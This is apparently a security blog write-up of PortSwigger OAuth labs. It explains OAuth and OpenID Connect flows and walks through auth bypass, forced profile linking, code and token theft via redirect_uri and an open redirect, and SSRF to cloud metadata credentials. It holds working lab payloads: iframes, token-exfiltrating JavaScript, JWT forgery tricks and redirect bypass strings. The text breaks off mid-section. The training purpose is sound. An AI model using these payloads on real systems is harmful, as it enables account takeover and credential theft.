---
title: "OAuth 2.0 Authentication Vulnerabilities"
description: "OAuth flows, OpenID Connect, and five PortSwigger labs covering authentication bypass, forced linking, code/token leakage, open redirects, and SSRF, with further notes on PKCE, ID tokens, and account linking."
date: 2026-10-29 11:00:00 +0700
lang: en
categories: [Web Security, PortSwigger Labs]
tags: [oauth, openid-connect, authentication, account-takeover, portswigger, writeup]
toc: true
media_subpath: /assets/img/posts/2026-10-29-oauth-authentication
pin: false
---

## I. What is OAuth, and why is it used for login?

You have probably seen buttons such as **Login with Google**, **Continue with Facebook**, or **Sign in with GitHub**. Instead of creating another password for a website, you go to another service, sign in, approve access, and return to the original website.

It looks simple, but several parties exchange data behind the scenes. If one of them fails to validate `redirect_uri`, trusts an email supplied by the browser, or links accounts without binding the operation to the initiating session, an attacker can interfere with the flow.

First, distinguish two concepts:

- **Authentication:** Who are you?
- **Authorization:** What may this application do, and with which resources?

**OAuth 2.0 is an authorization framework.** For example, I can let an application read photos from a storage service without giving it my password for that service. OAuth defines mechanisms for granting and using access; it does not, by itself, define a complete user login protocol. See [RFC 6749](https://www.rfc-editor.org/rfc/rfc6749.html#section-1).

Why, then, do people talk about “OAuth Authentication”? An application can use its newly granted access to retrieve user information and create a local login session. **OpenID Connect (OIDC)** adds an identity layer to OAuth 2.0, including an ID token for authentication. The labs also show applications that build their own login flow around information from an API.

This post starts with the fundamentals from my notes, examines five PortSwigger labs, and then explores related cases. Replace `YOUR-LAB-ID`, `YOUR-OAUTH-ID`, `YOUR-EXPLOIT-ID`, and example tokens with values from your own lab session.

---

## II. Components of an OAuth flow

### 1. Four main roles

| Role | Responsibility | Example |
| --- | --- | --- |
| Resource owner | Can authorize access to a resource. | Me, the owner of a social media account. |
| Client application | Requests permission to access resources. | A blog with a social login button. |
| Authorization server | Handles authorization and issues tokens. | The social media service's OAuth server. |
| Resource server | Exposes APIs for protected resources. | An API returning my profile, email, or photos. |

The authorization server and resource server may belong to the same service, but their roles differ. In the browser, you usually see both the blog's domain and the OAuth domain. Their cookies maintain separate sessions.

For example, logging out of the blog does not necessarily log you out of social media. On your next OAuth login, the social service may recognize you without asking for your password again. This matters in labs where the victim already has a session with the OAuth provider.

### 2. Common parameters

| Value | Purpose | What to remember |
| --- | --- | --- |
| `client_id` | Identifies a registered client. | Not a secret; its presence in a URL is normal. |
| `client_secret` | One way to authenticate a confidential client at the token endpoint. | Cannot remain secret when embedded in JavaScript distributed to every browser. |
| `redirect_uri` | The callback to which the authorization server sends the browser. | Validate against the registered URI, rather than checking only the domain. |
| `response_type` | Selects the authorization endpoint's response type. | `code` and `token` lead to different flows. |
| `scope` | Permissions requested by the client. | Granted permissions may be narrower than requested. |
| `state` | Binds an authorization response to a client-initiated transaction. | Must be unpredictable, session-bound, and checked on return. |
| `nonce` | Binds an ID token to its OIDC request. | Compare it with the ID token claim when applicable. |
| `code_challenge`, `code_verifier` | The two parts of PKCE. | Bind the authorization request to the code exchange. |

A **public client**, such as a browser or native application, cannot treat an embedded secret as sufficient proof of its identity. A **confidential client**, such as a web backend, can protect credentials on the server. Authorization Code is not limited to backends: public clients can also use it with PKCE.

### 3. Codes, tokens, and sessions are different things

These are easy to confuse when first examining Burp history:

| Component | Who uses it? | Purpose |
| --- | --- | --- |
| Authorization code | The client sends it to the token endpoint. | Exchanges it for tokens; short-lived and single-use. |
| Access token | The client sends it to the resource server. | Calls APIs within the granted scope; may be opaque or a JWT. |
| ID token | The OIDC client validates it. | Describes an authentication event and the user's identity. |
| Refresh token | The client sends it to the token endpoint, if issued. | Obtains a new access token; not used directly with resource APIs. |
| Session cookie | The browser sends it to the client website. | Maintains the website's local login session. |

Stealing a code and stealing an access token lead to different attack paths. A code must still be exchanged under the right conditions; a bearer access token can usually already call APIs that accept it. An ID token has its own intended audience and cannot simply be used with any API.

#### ID tokens and claims that require validation

An ID token is a JWT signed by an OIDC provider, containing information about an authentication event. **Receiving an ID token does not make it trustworthy.** The client must validate the relevant claims before trusting its identity information:

| Claim | Meaning | Consequence if skipped |
| --- | --- | --- |
| `iss` (issuer) | The token must come from the expected provider. | The client may trust a token issued by an attacker-controlled provider. |
| `aud` (audience) | The token must be issued for this client's `client_id`. | A token for application A may be accepted by application B. |
| `exp` (expiration) | The token must still be valid. | A stolen expired token may be replayed. |
| `nonce` | Must match the value in the authorization request. | An attacker may replay an ID token from another transaction. |
| `at_hash` | Binds an ID token to a particular access token in applicable flows. | Substitution of the accompanying access token may go undetected. |

The client must also verify the JWT signature using an explicitly permitted algorithm. Two common attacks are:

- **`alg: none`**: The attacker changes the payload, removes the signature, and sets `"alg":"none"`. Old libraries or incorrect configurations may accept the unsigned token.
- **Algorithm confusion (RS256 → HS256)**: The provider signs with an RSA private key, and the client verifies with the public key using RS256. If the attacker changes the algorithm to `HS256` and signs using the provider's public key as an HMAC secret, a vulnerable verifier may accept it.

```text
Header gốc:   {"alg":"RS256","typ":"JWT"}
Header sửa:   {"alg":"HS256","typ":"JWT"}
Secret dùng:  public key RSA của provider (lấy từ JWKS endpoint)
Kết quả:      client verify thành công mà attacker tự tạo payload
```

Prevent this by explicitly configuring the allowed algorithms instead of letting the received token choose the verification algorithm.

Another issue involves key selection. A provider's JWKS commonly exposes keys identified by `kid` in the JWT header. If the server uses `kid` in a file lookup or database query without proper handling:

```json
{"alg":"HS256","kid":"../../dev/null","typ":"JWT"}
```

Path traversal through `kid` may cause an unintended file's contents to become the verification key. SQL injection through a key lookup can similarly return an attacker-chosen key, which the attacker then uses to sign a token.

---

## III. How do OAuth flows work?

### 1. Authorization Code Grant

![Authorization Code flow: the browser receives a code, and the backend exchanges it for tokens and calls an API](image.png)

The diagram shows a website using OAuth-derived information for login. Let's break it down to see where each piece of data goes.

#### Step 1: Authorization request

The client directs the browser to the authorization endpoint:

```http
GET /auth?client_id=blog-client&redirect_uri=https%3A%2F%2Fclient.example%2Foauth-callback&response_type=code&scope=openid%20profile%20email&state=RANDOM-STATE HTTP/1.1
Host: auth.example
```

The client requests a `code`, asks for `openid profile email`, and specifies its registered callback. The `openid` scope indicates an OIDC request, although you must still check how the provider handles it and what it returns.

The client stores `state`, binding it to the initiating transaction and session. The provider returns it with the corresponding response. Merely echoing `state` does not prevent CSRF unless the client validates it.

#### Step 2: User login and consent

The authorization server authenticates the user if necessary and handles consent for the requested scopes. An existing session or remembered consent may skip some screens.

The user enters their password at the provider, rather than sharing it with the blog.

#### Step 3: Callback receives the authorization code

```http
HTTP/1.1 302 Found
Location: https://client.example/oauth-callback?code=ONE-TIME-CODE&state=RANDOM-STATE
```

The browser follows the redirect and sends a request to the client website:

```http
GET /oauth-callback?code=ONE-TIME-CODE&state=RANDOM-STATE HTTP/1.1
Host: client.example
Cookie: session=CLIENT-SESSION
```

The client must validate the corresponding transaction before proceeding. The code is neither the user's password nor an access token.

#### Step 4: The client exchanges the code for tokens

For a web backend, this request happens **server-to-server**:

```http
POST /token HTTP/1.1
Host: auth.example
Authorization: Basic BASE64_CLIENT_CREDENTIALS
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=ONE-TIME-CODE&redirect_uri=https%3A%2F%2Fclient.example%2Foauth-callback
```

Replace `BASE64_CLIENT_CREDENTIALS` with the appropriate Basic authentication value; client authentication depends on the provider's configuration. A PKCE flow also includes `code_verifier`.

**Why isn't this request visible in my Burp history?** Burp is proxying browser traffic, while the client backend calls the token endpoint directly. Observing this step requires backend logs or appropriate access to the backend.

#### Step 5: Token response

An example OIDC Code Flow response:

```json
{
  "access_token": "ACCESS-TOKEN",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "openid profile email",
  "id_token": "ID-TOKEN-JWT"
}
```

`ID-TOKEN-JWT` is a placeholder. Plain OAuth does not require an ID token. The client must still validate the tokens and flow bindings before trusting the returned identity.

#### Step 6: Call the resource API

```http
GET /userinfo HTTP/1.1
Host: auth.example
Authorization: Bearer ACCESS-TOKEN
```


```json
{
  "sub": "user-123",
  "name": "Nam",
  "email": "nam@example.com",
  "email_verified": true
}
```

`/userinfo` is an OIDC endpoint. The labs' `/me` endpoint belongs to that particular service; it is not a universal OAuth endpoint name.

#### Step 7: Create the website session

After identifying the correct local account, the website issues a session cookie to the browser. Subsequent blog requests use that cookie. Calls to the provider's API may continue to use an access token managed by the backend.

```text
Browser ── authorization request ──► Provider
Browser ◄── redirect có code ────── Provider
Browser ── callback có code ──────► Client backend
                                   │
                                   ├── đổi code lấy token ──► Provider
                                   └── gọi API user ────────► Resource server
Browser ◄── session cookie ──────── Client backend
```

### 2. Implicit Grant

![Implicit Grant flow: the access token is returned directly through the browser](image-1.png)

In the implicit-flow labs, the request uses `response_type=token`. Instead of returning a code for a later token exchange, the provider redirects with an access token in the fragment:

```http
HTTP/1.1 302 Found
Location: https://client.example/oauth-callback#access_token=ACCESS-TOKEN&token_type=Bearer&expires_in=3600
```

When the browser visits that URL, its HTTP request contains only:

```http
GET /oauth-callback HTTP/1.1
Host: client.example
```

The part after `#` is not included in the request target sent to the server. JavaScript on the page can still read it through `location.hash`. The response's `Location` header, visible to the proxy, can reveal the fragment returned by the server.

The key point is that the token passes through the browser environment. Page scripts, URL history, or an unsafe redirect chain can expose it. Excluding a fragment from HTTP requests does not isolate it from JavaScript.

This post covers implicit to explain the labs and older systems. [RFC 9700](https://www.rfc-editor.org/rfc/rfc9700.html#section-2.1.2) advises avoiding access tokens in authorization responses and preferring Code Flow. In standard OIDC, `response_type=token` alone is not a complete OIDC authentication flow, even when a lab includes `scope=openid`.

#### Why isn't the fragment sent in an HTTP request?

When a browser receives `Location: https://client.example/callback#access_token=XYZ`, it sends:

```http
GET /callback HTTP/1.1
Host: client.example
```

`#access_token=XYZ` is absent from the request line. A fragment identifies client-side content rather than a server resource. The server does not receive it in the HTTP request target. Page JavaScript can read it through `window.location.hash` or `document.location.hash`.

This has two consequences:

- **Positive:** the token is absent from normal server access logs.
- **Negative:** the token is present in browser memory, URL history, and the JavaScript environment; scripts running with the page's privileges can read it.

#### Token leakage through navigation and messaging

Callback JavaScript may navigate to another page after reading the token:

```javascript
// Trang /callback đọc token xong rồi redirect
window.location.href = "https://client.example/dashboard";
```

The following example illustrates a URL exposure to look for in custom navigation or logging code. Standard browsers strip fragments from the actual HTTP `Referer` header:

```http
GET /dashboard HTTP/1.1
Referer: https://client.example/callback#access_token=ACCESS-TOKEN
```

Incorrect `postMessage` use creates a related risk. For example, the callback might accept messages without checking their origin or broadcast a token to any parent origin:

```javascript
// Nguy hiểm: không kiểm tra origin
window.addEventListener("message", (e) => {
    useToken(e.data.access_token);
});

// Frame cha broadcast cho mọi origin
window.parent.postMessage({ access_token: token }, "*");
```

An unintended recipient may receive the token. Use a specific `targetOrigin` instead of `"*"` and validate `event.origin` on the receiving side.

### 3. Authorization Code + PKCE

PKCE proves that the party exchanging the code knows a value generated when the transaction began:

```text
code_verifier  = chuỗi ngẫu nhiên đủ mạnh, giữ tại client cho giao dịch
code_challenge = BASE64URL(SHA256(ASCII(code_verifier)))
```

The authorization request includes `code_challenge` and `code_challenge_method=S256`. The token request includes `code_verifier`; the server recomputes the challenge and compares it. An attacker who intercepts only the code cannot exchange it without the verifier in a correctly protected flow.

This Node.js example uses the sample pair from [RFC 7636](https://www.rfc-editor.org/rfc/rfc7636.html#appendix-B):

```javascript
const { createHash } = require("node:crypto");

// Giá trị cố định chỉ để minh họa, không tái sử dụng cho phiên thật.
const verifier = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk";
const challenge = createHash("sha256")
  .update(verifier, "ascii")
  .digest("base64url");

console.log(challenge);
// E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM
```

PKCE does not authenticate a public client's identity like a client secret, nor does it replace redirect URI or user identity validation. An attacker who initiates a transaction knows that transaction's verifier.

#### PKCE downgrade and the `plain` method

PKCE provides protection only when the provider enforces it for the transaction. If the server accepts a request without `code_challenge`, removing that parameter may let an intercepted code be exchanged without a verifier.

RFC 7636 defines two challenge methods:

| Method | Challenge calculation | Security property |
| --- | --- | --- |
| `S256` | `BASE64URL(SHA256(verifier))` | Knowing the challenge does not reveal the verifier. |
| `plain` | challenge = verifier | Anyone who sees the authorization request's challenge also has the verifier. |

With `plain`, exposing the authorization request through logs or another leak exposes the verifier too. Prefer `S256` and reject `plain` when `S256` is available. See [RFC 7636 section 4.2](https://www.rfc-editor.org/rfc/rfc7636#section-4.2) for the exact requirements.

### 4. How do `state`, `nonce`, and PKCE differ?

| Mechanism | Where is it checked? | Binding to protect |
| --- | --- | --- |
| `state` | The client compares the callback with its saved transaction. | Browser session and authorization response. |
| `nonce` | The OIDC client checks the ID token claim. | Authentication request and returned ID token. |
| PKCE | The token endpoint checks the verifier. | Code authorization transaction and code exchange. |

A single parameter does not prove that the whole flow is secure. Values must be generated, stored, and checked correctly. Under [RFC 9700's CSRF guidance](https://www.rfc-editor.org/rfc/rfc9700.html#section-2.1), some implementations can rely on PKCE or an OIDC nonce when the necessary conditions hold. Missing `state` warrants investigation but does not automatically prove an exploitable vulnerability.

#### Login CSRF versus account-linking CSRF

Even with the same missing `state`, the impact depends on what the OAuth flow does.

**Login CSRF:** The attacker makes the victim's browser complete login using the *attacker's* OAuth account. The victim unknowingly uses the attacker's account. Sensitive information the victim subsequently enters, such as an address or payment details, may become readable by the attacker.

```text
Attacker tạo authorization URL với account của mình
→ Gửi callback URL (chứa code của attacker) cho victim
→ Browser victim hoàn tất callback
→ Victim đang dùng tài khoản attacker mà nghĩ là tài khoản mình
```

**Account-linking CSRF:** The attacker makes the victim's account *link* to the *attacker's* OAuth profile. This can lead to full takeover of the victim's account, as in Lab 2.

```text
Attacker khởi tạo linking → lấy code của mình → gửi callback URL cho victim
→ Browser victim hoàn tất callback với cookie của victim
→ Tài khoản victim liên kết với OAuth profile của attacker
→ Attacker đăng nhập bằng OAuth profile của mình → vào tài khoản victim
```

During review or testing, distinguish login endpoints from linking endpoints. A callback that lacks clear context may serve both purposes and expose a larger attack surface than intended.

---

## IV. Working through the labs

### 1. Lab: Authentication bypass via OAuth implicit flow

**Lab link:** [Authentication bypass via OAuth implicit flow](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)

![The lab asks us to log in as Carlos without his password](image-2.png)

The goal is to log in as Carlos, whose email is `carlos@carlos-montoya.net`. The supplied social media credentials are `wiener:peter`.

#### Observe a normal login

Select My account and log in with social media. Burp history shows the client redirecting the browser to the provider's `/auth` endpoint:

![Authorization request in Burp with response_type=token](image-3.png)

`response_type=token` identifies the implicit flow. After login, the provider asks permission to share Profile and Email with the blog:

![Consent screen requesting Profile and Email access](image-4.png)

After consent, it returns a redirect with an access token in the fragment:

![The response Location contains an access token after #](image-5.png)

Client JavaScript reads the token, retrieves user information, and sends a request to the blog's `/authenticate` endpoint. Its body includes an email, username, and token.

#### Change the identity while keeping the token

Send `/authenticate` to Repeater, keep your own issued token, and replace the identity fields with Carlos's:

```http
POST /authenticate HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/json

{"email":"carlos@carlos-montoya.net","username":"carlos","token":"YOUR-OWN-ACCESS-TOKEN"}
```

![Carlos's email paired with the attacker's token produces a session](image-6.png)

The application accepts the request and creates a new session. Repeat the change through Proxy interception so the browser receives `Set-Cookie`, or use the response cookie for subsequent requests in the lab.

The flaw occurs when the client application converts browser-supplied data into a login identity. **My valid token does not prove that Carlos's email belongs to me.** The backend must obtain and verify the identity associated with that token at the trusted provider, rather than selecting an account using an email supplied by the browser.

```text
Token của Wiener + email tự khai của Carlos
  → backend không đối chiếu danh tính
  → session của Carlos
```

This is a token-to-identity binding flaw. It does not mean every implicit flow automatically permits authentication bypass.

### 2. Lab: Forced OAuth profile linking

**Lab link:** [Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)

![Forced linking: attach our social profile to the administrator's account](image-7.png)

The website supports username/password login and attaching a social profile. The blog credentials are `wiener:peter`; the social credentials are `peter.wiener:hotdog`.

The goal is to link **the attacker's social profile to the administrator's blog account**, then use that social profile to log in as the administrator.

#### Identify the linking request

Log in to the blog and choose Attach a social profile. The authorization request uses a dedicated callback:

```http
GET /auth?client_id=YOUR-CLIENT-ID&redirect_uri=https%3A%2F%2FYOUR-LAB-ID.web-security-academy.net%2Foauth-linking&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-YOUR-OAUTH-ID.oauth-server.net
```

This lab omits `state`, and the callback does not adequately verify that the person completing the operation initiated it.

#### Capture an unused code

Enable Proxy interception and start linking your own social account. Intercept:

```http
GET /oauth-linking?code=ATTACKER-UNUSED-CODE HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=ATTACKER-BLOG-SESSION
```

Copy the URL and **drop the request** instead of forwarding it. Forwarding may make the client exchange and consume the code, leaving it useless when sent to the victim.

#### Send the callback to the victim

Place this on the lab's exploit server:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=ATTACKER-UNUSED-CODE"></iframe>
```

The victim is logged in to the blog. Their browser sends the callback with their session cookie. The code represents the attacker's social profile, but the server selects the blog account using **the victim's session**. Missing transaction binding allows those identities to be linked.

```text
Code: social profile của attacker
Cookie callback: tài khoản blog của admin
  → liên kết social profile attacker với blog admin
```

After delivering the exploit, return to the blog and log in using your social account. If linking succeeded, you enter the administrator account and can delete `carlos` to complete the lab.

My notes also contain an automatically submitted form. If using it, the action must be the observed `/oauth-linking` endpoint, rather than `/oauth-link`. On other systems, SameSite cookies and embedding restrictions may prevent an iframe from carrying the session; inspect the actual request. The lab's conditions do not apply universally.

**Prevention:** Bind linking to the initiating session and transaction, validate CSRF protection, and require appropriate confirmation for sensitive actions. Keep login and linking purposes distinct rather than letting an ambiguous callback choose between them.

### 3. Lab: OAuth account hijacking via redirect_uri

**Lab link:** [OAuth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)

![Steal the administrator's authorization code to take over the account](image-8.png)

These notes belong to the topic “Leaking authorization codes and access tokens.” In this particular lab, we steal an **authorization code**, rather than an access token.

#### Change where the code is delivered

The normal flow redirects to the blog's callback:

```http
GET /auth?client_id=YOUR-CLIENT-ID&redirect_uri=https%3A%2F%2FYOUR-LAB-ID.web-security-academy.net%2Foauth-callback&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-YOUR-OAUTH-ID.oauth-server.net
```

If the provider accepts the exploit server as `redirect_uri`, we can make the victim's browser send the code there:

```html
<iframe src="https://oauth-YOUR-OAUTH-ID.oauth-server.net/auth?client_id=YOUR-CLIENT-ID&amp;redirect_uri=https%3A%2F%2FYOUR-EXPLOIT-ID.exploit-server.net%2Fexploit&amp;response_type=code&amp;scope=openid%20profile%20email"></iframe>
```

The victim already has a provider session. A successful flow produces a request to the exploit server like this:

```http
GET /exploit?code=VICTIM-UNUSED-CODE HTTP/1.1
Host: YOUR-EXPLOIT-ID.exploit-server.net
```

Read the access log, copy the code, and visit the real blog callback in your own browser:

```text
https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=VICTIM-UNUSED-CODE
```

In this lab, the code creates an administrator session. Open the admin panel and delete `carlos`.

#### Why isn't the client secret needed?

The attacker does not necessarily call `/token` directly. The legitimate application's callback can exchange the code on their behalf. The backend has valid client credentials but fails to validate which browser owns the transaction and the context in which the code was issued.

Account takeover therefore depends on checks at both the token endpoint and callback: client and redirect URI binding, PKCE, transaction binding, and session binding. A correct implementation may reject the modified `redirect_uri` immediately or reject the code exchange. **Finding a code in a log does not mean it can be replayed against every client.**

**Prevention:** Providers must validate registered callbacks precisely and enforce code binding. Clients must protect transactions, use PKCE appropriately, and reject callbacks without a valid transaction. A client secret alone does not protect a browser-mediated flow.

#### Bypassing weak redirect_uri validation

Lab 3 uses the simplest case: no effective validation. Real providers often validate URIs, but weak implementations may still be bypassed.

**1. Checking the domain without checking the path**

Accepting any path on a registered domain can combine with an open redirect to expose tokens. Lab 4 demonstrates this.

**2. Prefix matching instead of exact matching**

A provider might check only whether `redirect_uri` begins with a registered URI:

```
Đã đăng ký: https://client.example/oauth-callback
Bypass:      https://client.example/oauth-callback.evil.com/
             https://client.example/oauth-callbackEVIL
```

**3. Subdomain wildcards or loose regular expressions**

```
Đã đăng ký: https://*.client.example/callback
Bypass:      https://evil.client.example/callback   ← attacker kiểm soát subdomain
```

Or a regular expression uses `.` rather than `\.`:

```
Pattern:  client.example  (dấu chấm không escape)
Khớp:     clientXexample  (X là bất kỳ ký tự nào)
```

**4. Parameter pollution and fragment injection**

Some parsers accept variants such as:

```
redirect_uri=https://client.example/callback?extra=param
redirect_uri=https://client.example/callback#fragment
```

Naively appending `?code=...` to an existing query can produce:

```
https://client.example/callback?extra=param?code=CODE
```

The browser sends the path and query to the server, but the client may parse `code` incorrectly. A fragment adds another parsing boundary; verify where response parameters are actually placed and which component reads them.

**5. Localhost validation in native apps**

A native app may register `http://localhost/callback`. Overly broad localhost validation can accept unintended variants:

```
http://localhost.evil.com/callback   ← một số parser cũ coi là localhost
http://127.0.0.1/callback            ← đôi khi được chấp nhận thay http://localhost
```

RFC 8252 allows variable ports for loopback redirects in native apps; that does not imply that every hostname variation should be accepted. Equivalent IP representations may bypass string filters: `http://2130706433/` (decimal), `http://0x7f000001/` (hexadecimal), or `http://[::1]/` (IPv6). Wildcard DNS names such as `attacker.127.0.0.1.sslip.io` can resolve to the same address while defeating a hostname-only check.

**6. Authority confusion using `@`**

```
https://trusted.example.com@attacker.example.com/callback
```

`startsWith("https://trusted.example.com")` returns true. However, URL syntax treats the text before `@` as user information; the actual host follows it. The browser connects to `attacker.example.com`.

During an authorized assessment, test parsing variants against the registered URIs you observe.

### 4. Lab: Stealing OAuth access tokens via an open redirect

**Lab link:** [Stealing OAuth access tokens via an open redirect](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)

![Steal the administrator's access token and use their API key to finish the lab](image-9.png)

Like Lab 1, this uses implicit flow, but the provider validates `redirect_uri`. We cannot replace it directly with the exploit server's domain.

#### Identify the flow

`response_type=token` confirms implicit flow. After consent, the provider returns the access token in a fragment:

```http
GET /auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback&response_type=token&nonce=RANDOM&scope=openid%20profile%20email HTTP/1.1
Host: oauth-YOUR-OAUTH-ID.oauth-server.net
```

The redirect to the callback places the token after `#`:

```http
HTTP/1.1 302 Found
Location: https://YOUR-LAB-ID.web-security-academy.net/oauth-callback#access_token=ACCESS-TOKEN&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```

Client JavaScript reads `location.hash`, calls `/me`, and creates a session. Changing `redirect_uri` to another domain fails because the provider requires the registered hostname.

#### Find an open redirect on the allowed domain

Because fragments are not sent to the server, ordinary HTTP logs do not reveal the token. We need a page on the blog's domain that **forwards the fragment to a location we control**.

Each blog post has a Next post button using `path`:

```http
GET /post/next?path=/post?postId=5 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

The server redirects to the supplied path. Try an external destination:

```
/post/next?path=https://YOUR-EXPLOIT-ID.exploit-server.net/exploit/
```

The server redirects externally too. This is an open redirect on the domain accepted by the provider.

#### Construct the exploit redirect_uri

The provider validates the hostname without strictly validating the path. Combine path traversal with the open redirect:

```
redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-ID.exploit-server.net/exploit/
```

The normalized path becomes `/post/next?path=https://YOUR-EXPLOIT-ID...`. The provider redirects there with the access token in the fragment. The blog redirects again to the exploit server. The fragment is inherited when the next `Location` does not specify its own fragment.

#### Build and deliver the payload

The victim already has a provider session. Visiting the exploit page must trigger authorization. Since the exploit server cannot read a fragment from the incoming HTTP request, JavaScript reads `location.hash` and sends it as a query instead:

```html
<script>
if (!document.location.hash) {
    window.location = 'https://oauth-YOUR-OAUTH-ID.oauth-server.net/auth?client_id=YOUR-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-ID.exploit-server.net/exploit/&response_type=token&nonce=RANDOM&scope=openid%20profile%20email';
} else {
    window.location = '/?'+document.location.hash.substr(1);
}
</script>
```

The flow is:

```text
Victim truy cập exploit page
  → không có hash → chuyển hướng sang authorization request với redirect_uri đã sửa
  → Provider redirect về /post/next?path=exploit-server#access_token=...
  → Blog redirect sang exploit server/exploit/#access_token=...
  → Exploit page load lại, lần này có hash
  → Gửi /? + hash.substr(1) đến exploit server dưới dạng query string
  → Log ghi lại access_token trong query parameter
```

Read `access_token` from the exploit server's query-string log and call `/me`:

```http
GET /me HTTP/1.1
Host: oauth-YOUR-OAUTH-ID.oauth-server.net
Authorization: Bearer VICTIM-ACCESS-TOKEN
```

The response contains the administrator's `apikey`. Use it to finish the lab.

The exploit combines two flaws: loose path validation by the provider and an unrestricted open redirect in the blog. Together, they expose the token through redirect fragment inheritance.

### 5. Lab: SSRF via OpenID dynamic client registration

**Lab link:** [SSRF via OpenID dynamic client registration](https://portswigger.net/web-security/oauth/lab-oauth-ssrf-via-openid-dynamic-client-registration)

![Use dynamic client registration SSRF to retrieve a secret key from instance metadata](image-10.png)

This lab targets **SSRF** through OpenID Connect dynamic client registration, rather than account takeover.

#### Discover OIDC configuration

OAuth/OIDC servers commonly publish metadata at a standard endpoint:

```
GET /.well-known/openid-configuration HTTP/1.1
Host: oauth-YOUR-OAUTH-ID.oauth-server.net
```

The JSON response describes the server's configuration, including:

```json
"registration_endpoint": "https://oauth-YOUR-OAUTH-ID.oauth-server.net/reg"
```

This endpoint implements [RFC 7591 Dynamic Client Registration](https://www.rfc-editor.org/rfc/rfc7591). Some deployments allow unauthenticated registration.

#### Register a client with a malicious logo_uri

OIDC client metadata may include `logo_uri`, the URL of the application's logo. When the authorization server displays the logo on its consent screen, it may fetch that URL from the server side, creating an SSRF entry point.

First point `logo_uri` to Burp Collaborator or a similar endpoint to confirm server-side fetching. Then replace it with an internal metadata address:

```http
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-ID.oauth-server.net
Content-Type: application/json

{
    "redirect_uris": ["https://example.com"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

The response describes the new client, including its `client_id`:

```json
{
    "client_id": "NEW-CLIENT-ID",
    "redirect_uris": ["https://example.com"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

#### Trigger SSRF through the logo endpoint

Make the server fetch `logo_uri` by requesting the new client's logo endpoint:

```http
GET /client/NEW-CLIENT-ID/logo HTTP/1.1
Host: oauth-YOUR-OAUTH-ID.oauth-server.net
```

The backend requests `http://169.254.169.254/...`, reads IAM credentials, and returns them in the response body, exposing the secret key.

```text
POST /reg         → đăng ký client với logo_uri trỏ vào metadata server
GET /client/.../logo → server fetch logo → SSRF → lấy credentials
```

**Why is this possible?**

1. `/reg` permits unauthenticated registration.
2. The server fetches `logo_uri` without rejecting internal destinations.

**Prevention:**

- Require appropriate authorization for dynamic client registration.
- Reject link-local (`169.254.x.x`), localhost, and private destinations when fetching user-controlled URLs.
- Allowlist valid destinations for URI fields fetched by the server.

---

## V. How the vulnerabilities connect

These five labs represent commonly missed checks in OAuth flows:

| Lab | Missing check | Result |
| --- | --- | --- |
| 1. Implicit bypass | The client trusts a browser-supplied email without binding it to the token. | Login as another user. |
| 2. Forced linking | Missing transaction/session binding and CSRF protection. | Attach the attacker's social profile to the administrator's account. |
| 3. Redirect URI leak | The provider fails to validate `redirect_uri`. | Steal the victim's authorization code. |
| 4. Open redirect + token | Arbitrary callback paths combine with an open redirect. | Steal an access token through redirects and fragment inheritance. |
| 5. Registration SSRF | Open registration and server-side fetching of `logo_uri`. | Retrieve internal credentials through SSRF. |

The vulnerabilities often depend on several conditions. Lab 4 needs both weak URI validation and a client-side open redirect. Lab 5 needs accessible registration and arbitrary URL fetching. OAuth exploitation commonly combines several smaller weaknesses.

When assessing a flow, I usually work through these steps:

1. **Identify the grant type:** implicit or code, and whether PKCE is used.
2. **Check `redirect_uri`:** exact allowlisting or only domain validation?
3. **Inspect `state`:** present, validated, and bound to the session?
4. **Track tokens:** fragments, queries, or server-side only?
5. **Find OIDC endpoints:** `/reg`, `/.well-known/openid-configuration`, and client logos.
6. **Examine secondary flows:** account linking, remembered sessions, and remembered consent.

A component that looks acceptable on its own can become dangerous in combination with another condition. Checklists cannot replace understanding the complete flow.

---

## VI. Beyond the labs

### 1. Token leakage during callback navigation

Implicit flow leaves an access token in the URL fragment. Callback scripts, analytics, or custom logging may expose the full URL when they explicitly read and transmit it. Standard browser HTTP `Referer` headers exclude fragments; the fragment-bearing `Referer` below should be treated as a nonstandard or custom behavior to investigate, rather than normal browser behavior.

```text
Browser nhận:
  Location: https://client.example/callback#access_token=TOKEN&token_type=Bearer

JS trên /callback điều hướng:
  window.location.href = "https://client.example/dashboard";

Request tới /dashboard:
  GET /dashboard HTTP/1.1
  Host: client.example
  Referer: https://client.example/callback#access_token=TOKEN&token_type=Bearer
```

If a page or library explicitly sends the complete callback URL to a server or third party, the token can enter logs or analytics. A normal external link does not, by itself, send the fragment in its `Referer` header.

**Client-side mitigations:**

- Clear the fragment using the History API immediately after reading the token and before running other navigation or tracking code.
- Use `<meta name="referrer" content="no-referrer">` or `Referrer-Policy: no-referrer` to limit other referrer data exposure.
- Prefer Authorization Code + PKCE over implicit flow.

### 2. Scope escalation

OAuth scopes describe granted permissions. Two related attack paths are worth testing.

#### 2a. Requesting more scopes than the client is allowed

A client registered for `profile email` may try requesting additional privileges:

```http
